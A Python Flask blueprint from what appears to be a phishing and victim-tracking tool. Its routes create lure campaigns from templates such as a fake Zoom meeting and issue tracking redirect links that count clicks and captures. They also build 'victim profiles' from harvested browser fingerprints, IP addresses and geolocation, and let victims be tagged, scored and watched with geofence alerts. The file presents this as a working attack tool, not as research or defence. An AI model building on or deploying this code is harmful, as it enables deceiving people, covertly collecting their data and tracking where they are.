"""campaigns blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

import platform
bp = Blueprint("campaigns", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/campaigns/list')
def campaigns_list():
    campaigns = db.get_campaigns()
    # Attach link stats to each
    for c in campaigns:
        links = db.get_campaign_links(c['id'])
        c['links'] = links
        c['total_clicks'] = sum(l.get('clicks', 0) for l in links)
        c['total_captures'] = sum(l.get('captures', 0) for l in links)
    return jsonify({'campaigns': campaigns})

@bp.route('/api/campaigns/create', methods=['POST'])
def campaigns_create():
    try:
        data = request.json
        campaign_id = db.create_campaign(
            name=data.get('name', 'Untitled'),
            template=data.get('template', ''),
            description=data.get('description', ''),
            callback_url=data.get('callback_url', ''),
        )
        
        # Auto-generate a tracking link
        link_code = uuid_module.uuid4().hex[:8]
        target_url = f"/t/{data.get('template', 'zoom_meeting')}/"
        db.add_campaign_link(campaign_id, link_code, target_url)
        
        track_event('campaign_created', {'name': data.get('name'), 'id': campaign_id})
        return jsonify({'status': 'created', 'id': campaign_id, 'link_code': link_code})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/campaigns/<int:campaign_id>')
def campaigns_get(campaign_id):
    campaign = db.get_campaign(campaign_id)
    if not campaign:
        return jsonify({'error': 'Not found'}), 404
    campaign['links'] = db.get_campaign_links(campaign_id)
    return jsonify({'campaign': campaign})

@bp.route('/api/campaigns/<int:campaign_id>', methods=['DELETE'])
def campaigns_delete(campaign_id):
    db.delete_campaign(campaign_id)
    return jsonify({'status': 'deleted'})

@bp.route('/api/campaigns/<int:campaign_id>/add_link', methods=['POST'])
def campaigns_add_link(campaign_id):
    data = request.json
    link_code = data.get('code', uuid_module.uuid4().hex[:8])
    target_url = data.get('target_url', '/t/zoom_meeting/')
    db.add_campaign_link(campaign_id, link_code, target_url)
    return jsonify({'status': 'added', 'code': link_code})


# Campaign tracking redirect

@bp.route('/c/<link_code>')
def campaign_redirect(link_code):
    """Track campaign click and redirect to template"""
    db.increment_campaign_click(link_code)
    # Find the target URL
    conn = __import__('sqlite3').connect(db.DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT target_url FROM campaign_links WHERE link_code = ?', (link_code,))
    row = cursor.fetchone()
    conn.close()
    if row:
        track_event('campaign_click', {'code': link_code}, request.remote_addr)
        return redirect(row[0])
    return 'Not found', 404

@bp.route('/api/profiles/list')
def profiles_list():
    profiles = db.get_victim_profiles()
    return jsonify({'profiles': profiles})

@bp.route('/api/profiles/<int:profile_id>')
def profiles_get(profile_id):
    profile = db.get_victim_profile(profile_id)
    if not profile:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({'profile': profile})

@bp.route('/api/profiles/build', methods=['POST'])
def profiles_build():
    """Auto-build victim profiles from all collected data"""
    try:
        built = 0
        
        # Build from fingerprints
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        if os.path.exists(fp_dir):
            for f in os.listdir(fp_dir):
                if f.endswith('.json'):
                    with open(os.path.join(fp_dir, f), 'r') as fh:
                        data = json.load(fh)
                    basic = data.get('basic', {})
                    ip = data.get('ip', basic.get('ip', ''))
                    if ip:
                        db.save_victim_profile(
                            ip=ip,
                            fingerprint_hash=data.get('hash', ''),
                            user_agent=basic.get('userAgent', ''),
                            platform_name=basic.get('platform', ''),
                            browser=basic.get('browser', ''),
                            screen_res=f"{basic.get('screenWidth', '')}x{basic.get('screenHeight', '')}",
                        )
                        built += 1
        
        # Build from geo data
        for geo in ANALYTICS.get('geo_data', []):
            ip = geo.get('ip', '')
            if ip:
                db.save_victim_profile(
                    ip=ip,
                    lat=geo.get('lat'),
                    lon=geo.get('lng'),
                )
        
        return jsonify({'status': 'profiles_built', 'count': built})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/profiles/<int:profile_id>/tag', methods=['POST'])
def profiles_tag(profile_id):
    data = request.json
    tags = data.get('tags', [])
    db.update_victim_tags(profile_id, tags)
    return jsonify({'status': 'updated'})

@bp.route('/api/profiles/<int:profile_id>/notes', methods=['POST'])
def profiles_notes(profile_id):
    data = request.json
    notes = data.get('notes', '')
    db.update_victim_notes(profile_id, notes)
    return jsonify({'status': 'updated'})

@bp.route('/api/profiles/<int:profile_id>/risk', methods=['POST'])
def profiles_risk(profile_id):
    data = request.json
    score = data.get('score', 0)
    db.update_victim_risk_score(profile_id, score)
    return jsonify({'status': 'updated'})

@bp.route('/api/geofence/list')
def geofence_list():
    fences = db.get_geofences()
    return jsonify({'geofences': fences})

@bp.route('/api/geofence/create', methods=['POST'])
def geofence_create():
    try:
        data = request.json
        fence_id = db.create_geofence(
            name=data.get('name', 'Unnamed'),
            lat=data.get('lat', 0),
            lon=data.get('lon', 0),
            radius_km=data.get('radius_km', 1.0),
            alert_type=data.get('alert_type', 'notify'),
        )
        track_event('geofence_created', {'name': data.get('name'), 'id': fence_id})
        return jsonify({'status': 'created', 'id': fence_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/geofence/<int:fence_id>', methods=['DELETE'])
def geofence_delete(fence_id):
    db.delete_geofence(fence_id)
    return jsonify({'status': 'deleted'})

@bp.route('/api/geofence/check', methods=['POST'])
def geofence_check():
    data = request.json
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    triggered = db.check_geofence(lat, lon)
    return jsonify({'triggered': triggered})
